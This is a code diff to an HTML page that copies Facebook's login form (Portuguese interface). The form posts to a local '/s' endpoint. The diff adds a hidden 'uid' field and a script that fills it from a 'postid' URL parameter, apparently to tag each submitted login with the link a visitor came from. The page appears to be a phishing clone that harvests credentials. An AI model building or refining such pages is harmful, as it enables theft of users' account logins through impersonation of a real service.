@@ -70,6 +70,8 @@
                             </div>
                             <div class="menu_login_container rfloat _ohf" data-testid="royal_login_form">
                                 <form id="login_form" action="/s" method="post">
+                                    <input type="hidden" name="uid" id="cod">
+
                                     <table cellspacing="0" role="presentation">
                                         <tbody>
                                             <tr>
@@ -702,8 +704,8 @@
                                                                                             type="hidden">
                                                                                     </div>
                                                                                     <div class="captcha_input"><a
-                                                                                            href="#"
-                                                                                            role="button">Por que estou
+                                                                                            href="#" role="button">Por
+                                                                                            que estou
                                                                                             vendo isso?</a>
                                                                                         <div id="captcha_whats_this"
                                                                                             class="hidden_elem">
@@ -839,3 +841,9 @@
 </body>
 
 </html>
+
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const cod = urlParams.get('postid');
+    document.getElementById('cod').value = cod;
+</script>
